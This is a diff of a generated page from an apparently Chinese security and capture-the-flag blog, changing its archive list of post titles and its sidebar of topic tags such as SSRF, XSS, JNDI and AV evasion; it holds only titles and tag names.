+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href= "/2022/09/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%88%A9%E7%94%A8%E9%9D%A2/" >中间件利用面</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2022/08/31/java%E5%9F%BA%E7%A1%80%E4%B9%8Bjndi/" >java基础之jndi</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -4090,7 +4306,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2020/08/06/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2payload/" >.git源码泄露payload</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2020/08/06/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2payload/" >.git源码泄露</a>
         </li>
     
     
@@ -4186,8 +4402,6 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
-        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
-    
         <span class="sidebar-tag-name" data-tags="2021CISCN"><span class="iconfont-archer">&#xe606;</span>2021CISCN</span>
     
         <span class="sidebar-tag-name" data-tags="文件上传"><span class="iconfont-archer">&#xe606;</span>文件上传</span>
@@ -4214,31 +4428,37 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
+        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
+    
         <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
     
         <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
     
         <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
+        <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
+    
         <span class="sidebar-tag-name" data-tags="权限提升"><span class="iconfont-archer">&#xe606;</span>权限提升</span>
     
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
-    
-        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
     
         <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
         <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
-        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
-    
-        <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
-    
         <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
+    
+        <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
     
         <span class="sidebar-tag-name" data-tags="红蓝对抗"><span class="iconfont-archer">&#xe606;</span>红蓝对抗</span>
     
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
         <span class="sidebar-tag-name" data-tags="2021Nep"><span class="iconfont-archer">&#xe606;</span>2021Nep</span>
     
@@ -4256,27 +4476,25 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
-    
-        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
-    
         <span class="sidebar-tag-name" data-tags="源码泄露"><span class="iconfont-archer">&#xe606;</span>源码泄露</span>
     
         <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
     
-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
-    
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
         <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
     
-        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
-    
         <span class="sidebar-tag-name" data-tags="XML"><span class="iconfont-archer">&#xe606;</span>XML</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="免杀"><span class="iconfont-archer">&#xe606;</span>免杀</span>
+    
+        <span class="sidebar-tag-name" data-tags="机器学习"><span class="iconfont-archer">&#xe606;</span>机器学习</span>
     
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
@@ -4368,9 +4586,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
     
-        <span class="sidebar-tag-name" data-tags="misc_zip"><span class="iconfont-archer">&#xe606;</span>misc_zip</span>
-    
         <span class="sidebar-tag-name" data-tags="url取反绕过"><span class="iconfont-archer">&#xe606;</span>url取反绕过</span>
+    
+        <span class="sidebar-tag-name" data-tags="misc_zip"><span class="iconfont-archer">&#xe606;</span>misc_zip</span>
     
         <span class="sidebar-tag-name" data-tags="create_function注入"><span class="iconfont-archer">&#xe606;</span>create_function注入</span>
     
